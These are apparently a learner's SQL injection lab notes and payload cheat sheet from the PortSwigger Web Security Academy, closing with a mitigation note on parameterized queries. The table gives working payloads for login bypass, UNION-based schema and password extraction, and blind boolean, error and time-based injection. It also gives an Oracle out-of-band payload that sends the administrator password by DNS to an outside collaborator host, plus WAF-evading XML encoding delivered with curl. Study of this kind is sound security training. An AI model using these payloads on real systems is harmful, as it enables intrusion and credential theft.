# PortSwigger SQL Injection (SQLi) Cheat Sheet & Lab Notes

This document serves as a comprehensive reference guide for SQL Injection vulnerabilities, payloads, and bypass techniques based on the PortSwigger Web Security Academy SQLi learning path.

## Core Concepts & Mechanics
* The majority of SQL injections occur within the `WHERE` clause of a `SELECT` query.
* Other injection points include `UPDATE` statements (within updated values or `WHERE` clauses), `INSERT` statements (within inserted values), and `SELECT` statements (within table/column names or `ORDER BY` clauses).
* The single quote `'` is a crucial closing delimiter that allows an attacker to "break out" of a string-based literal and execute arbitrary SQL commands.
* SQL comments (`--` or `#`) are used to truncate the rest of the legitimate query, neutralizing password checks or subsequent logic. Note: MySQL requires a space after the double dash (`-- `).

---

## Comprehensive SQLi Payload Table

| Vulnerability / Lab Context | Explanation & Methodology | Payloads & Commands |
| :--- | :--- | :--- |
| **Authentication Bypass** | Bypassing login forms by commenting out the password verification check in the SQL query. | `username'--`<br>`'+OR+1=1--` |
| **UNION Attack: Finding Columns** | The injected `UNION` query must return the exact same number of columns as the original query. You can increment `ORDER BY` or add `NULL` values until the server stops throwing errors. | `' ORDER BY 1--`<br>`' UNION SELECT NULL--`<br>`' UNION SELECT NULL,NULL--` |
| **UNION Attack: Finding Data Types** | The data types in the injected columns must match the original query. Substitute `NULL` with a string (e.g., `'a'`) sequentially to find a column that accepts string data. | `' UNION SELECT 'a',NULL,NULL--`<br>`' UNION SELECT NULL,'a',NULL--` |
| **UNION Attack: Concatenation** | If only one column is returned to the web page but you need multiple pieces of data (e.g., username and password), use the double pipe `\|\|` operator to concatenate them into a single string. | `' UNION SELECT username \|\| '~' \|\| password FROM users--` |
| **Database Version Enum** | Extracting the database software and version to tailor subsequent payloads.  | **MS SQL:** `' UNION SELECT @@version--`<br>**Oracle:** `' UNION SELECT * FROM v$version--`<br>**PostgreSQL:** `' UNION SELECT version()--` |
| **Database Schema Enum** | Querying the built-in information schema to map out tables and columns. Oracle uses a different structure, but most others use `information_schema`. | **Tables:** `' UNION SELECT table_name,NULL FROM information_schema.tables--`<br>**Columns:** `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_prqzzu'--`<br>**Extract:** `' UNION SELECT username_nvtkzg, password_ebyprr FROM users_prqzzu--` |
| **Blind SQLi: Conditional Responses** | Extracting data character-by-character when the application returns different content (e.g., "Welcome back" vs. nothing) based on whether a boolean query is True or False. | `[ID]' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{i},1)='{char}'--` |
| **Blind SQLi: Conditional Errors** | Forcing the database to throw a visible error (like divide-by-zero) only if a specific condition is met. Useful when boolean true/false responses aren't reflected in the HTML. | `[ID]'\|\|(SELECT CASE WHEN SUBSTR(password,{i},1)>'{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')\|\|'` |
| **Blind SQLi: Verbose Errors** | Exploiting applications that return raw database error messages to the screen. You intentionally cause a type conversion failure to leak data. | `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--` |
| **Blind SQLi: Time-Based** | Using sleep commands to infer data based on how long the server takes to respond. Crucial for fully asynchronous blind vulnerabilities. | `[ID]'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTR(password,{i},1)='{char}')+THEN pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--` |
| **Blind SQLi: OAST (Ping)** | Out-of-Band Application Security Testing. Tricking the database engine into acting like a browser and sending a DNS/HTTP request to an external server you control (e.g., Burp Collaborator, Interactsh).  | **Oracle (Pre-URL Encode):** `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-ID.oastify.com/"> %remote;]>'),'/l') FROM dual--` |
| **Blind SQLi: OAST Exfiltration** | Concatenating the target secret (like a password) directly into the subdomain of the OAST URL. The database performs a DNS lookup, leaving the password sitting cleanly in your external listener's DNS logs. | `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'\|\|(SELECT password FROM users WHERE username='administrator')\|\|'.YOUR-ID.oastify.com/"> %remote;]>'),'/l') FROM dual--` |
| **WAF Bypass: XML Encoding** | Evading Web Application Firewalls (WAFs) that block keywords like `UNION` or `SELECT` by hex-encoding the characters in an XML entity format. The WAF ignores the hex, but the backend XML parser decodes and executes the SQL.  | **Python Generator:** `python3 -c "print(''.join(['&#x%02x;' % ord(c) for c in 'YOUR_PAYLOAD']))"`<br>**Payload structure:** `<storeId>&#x55;&#x4e...[FULL_HEX_STRING]...</storeId>` |
| **Terminal / cURL Execution** | Automating XML payload delivery via the terminal. Using `--data-binary` ensures the hex entities are not reformatted or stripped before reaching the target. | `curl -X POST 'https://[LAB-ID].web-security-academy.net/product/stock' -H 'Content-Type: application/xml' -H 'Cookie: session=[ID]' --data-binary @payload.xml` |

---

## Mitigation & Prevention
SQL injections are fundamentally prevented by using **parameterized queries** (also known as prepared statements). This ensures that user input is treated strictly as data/string literals by the database engine, rather than executable code.